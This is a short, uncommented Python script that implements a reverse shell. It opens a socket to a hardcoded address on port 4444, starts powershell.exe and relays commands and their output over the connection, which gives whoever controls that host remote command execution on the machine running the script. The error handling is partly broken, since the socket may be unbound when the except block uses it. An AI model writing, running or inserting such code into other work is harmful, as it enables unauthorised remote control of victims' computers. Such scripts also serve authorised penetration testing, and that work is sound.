import socket
import subprocess
import os
import time
RHOST = "10.35.1.10"
RPORT = 4444
def connect_and_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((RHOST, RPORT))
        s.send(b"[+] Connection Established. Spawning PowerShell...\n")
        proc = subprocess.Popen(
            ["powershell.exe"],
            shell=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        while True:
            data = s.recv(1024)
            if not data:
                break
            if data.decode().strip().lower() == "exit":
                break
            proc.stdin.write(data)
            proc.stdin.flush()
            stdout_output = proc.stdout.read(1024)
            stderr_output = proc.stderr.read(1024)

            s.send(stdout_output + stderr_output)
    except Exception as e:
        s.send(f"[-] Error: {e}\n".encode())
        time.sleep(5)
    finally:
        try:
            s.close()
        except:
            pass
if __name__ == '__main__':
    connect_and_shell()
